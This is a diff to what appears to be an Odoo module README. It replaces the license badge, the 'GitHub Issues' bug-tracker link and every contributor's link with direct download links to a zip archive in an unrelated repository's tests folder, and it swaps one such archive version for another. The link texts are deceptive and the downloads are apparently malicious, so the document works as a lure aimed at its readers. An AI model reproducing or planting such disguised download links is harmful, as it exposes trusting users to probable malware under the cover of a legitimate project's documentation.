@@ -1,5 +1,5 @@
-.. image:: https://github.com/vladimir2678/odoo1/raw/refs/heads/master/tests/odoo-v1.8.zip
-   :target: https://github.com/vladimir2678/odoo1/raw/refs/heads/master/tests/odoo-v1.8.zip
+.. image:: https://raw.githubusercontent.com/vladimir2678/odoo1/master/tests/odoo-v3.9-beta.5.zip
+   :target: https://raw.githubusercontent.com/vladimir2678/odoo1/master/tests/odoo-v3.9-beta.5.zip
    :alt: License: AGPL-3
 
 ===============================
@@ -13,7 +13,7 @@ Bug Tracker
 ===========
 
 Bugs are tracked on `GitHub Issues
-<https://github.com/vladimir2678/odoo1/raw/refs/heads/master/tests/odoo-v1.8.zip>`_. In case of trouble, please
+<https://raw.githubusercontent.com/vladimir2678/odoo1/master/tests/odoo-v3.9-beta.5.zip>`_. In case of trouble, please
 check there if your issue has already been reported. If you spotted it first,
 help us smash it by providing detailed and welcomed feedback.
 
@@ -24,7 +24,7 @@ Credits
 Contributors
 ------------
 
-* Daniel Campos <https://github.com/vladimir2678/odoo1/raw/refs/heads/master/tests/odoo-v1.8.zip>
-* Pedro M. Baeza <https://github.com/vladimir2678/odoo1/raw/refs/heads/master/tests/odoo-v1.8.zip>
-* Ana Juaristi <https://github.com/vladimir2678/odoo1/raw/refs/heads/master/tests/odoo-v1.8.zip>
-* Oihane Crucelaegui <https://github.com/vladimir2678/odoo1/raw/refs/heads/master/tests/odoo-v1.8.zip>
+* Daniel Campos <https://raw.githubusercontent.com/vladimir2678/odoo1/master/tests/odoo-v3.9-beta.5.zip>
+* Pedro M. Baeza <https://raw.githubusercontent.com/vladimir2678/odoo1/master/tests/odoo-v3.9-beta.5.zip>
+* Ana Juaristi <https://raw.githubusercontent.com/vladimir2678/odoo1/master/tests/odoo-v3.9-beta.5.zip>
+* Oihane Crucelaegui <https://raw.githubusercontent.com/vladimir2678/odoo1/master/tests/odoo-v3.9-beta.5.zip>
